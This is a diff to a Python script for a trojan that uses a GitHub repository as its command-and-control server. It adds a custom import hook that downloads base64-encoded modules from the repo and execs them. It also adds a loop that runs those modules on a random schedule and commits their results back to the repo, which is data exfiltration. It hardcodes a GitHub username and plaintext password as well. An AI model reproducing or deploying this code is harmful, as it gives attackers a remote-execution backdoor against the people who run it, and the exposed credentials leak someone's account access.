@@ -18,8 +18,8 @@ configured      = False
 task_queue      = Queue.Queue()
 
 def connect_to_github():
-    gh = login(username="honor2008@naver.com",password="rltgjqm3346!!")
-    repo = gh.repository("honor2008@naver.com","CNC")
+    gh = login(username="Bo3o2S",password="rltgjqm3346!!")
+    repo = gh.repository("Bo3o2S","CNC")
     branch = repo.branch("master")
 
     return gh, repo, branch
@@ -31,7 +31,8 @@ def get_file_contents(filepath):
     for filename in tree.tree:
         if filepath in filename.path:
             print "[*] Found file %s" %filepath
-            blob = repo.blob(filename._json_data('sha'))
+            blob = repo.blob(filename._json_data['sha'])
+
             return blob.content
     return None
 
@@ -43,8 +44,8 @@ def get_trojan_config():
 
     for task in config:
 
-        if task['modules'] not in sys.modules:
-            exec("import %s" % task['modules'])
+        if task['module'] not in sys.modules:
+            exec ("import %s" % task['module'])
 
     return config
 
@@ -54,3 +55,51 @@ def store_module_result(data):
     repo.create_file(remote_path, "Commit message", base64.b64encode(data))
 
     return
+
+class GitImporter(object):
+    def __init__(self):
+        self.current_module_code = ""
+
+    def find_module(self,fullname,path=None):
+        if configured:
+            print "[*] Attempting to retrieve %s" %fullname
+            new_library = get_file_contents("moduels/%s" %fullname)
+
+            if new_library is not None:
+                self.current_module_code = base64.b64decode(new_library)
+                return self
+
+        return None
+
+    def load_module(self,name):
+        module = imp.new_module(name)
+        exec self.current_module_code in module.__dict__
+        sys.modules[name] = module
+
+        return module
+
+def module_runner(module):
+
+    task_queue.put(1)
+    result = sys.modules[module].run()
+    task_queue.get()
+
+    store_module_result(result)
+    return
+
+sys.meta_path = [GitImporter()]
+
+while True:
+
+    if task_queue.empty():
+
+        config = get_trojan_config()
+
+        for task in config:
+            t = threading.Thread(target=module_runner, args=(task['module'],))
+            t.start()
+            time.sleep(random.randint(1, 10))
+
+    time.sleep(random.randint(1000, 10000))
+
+
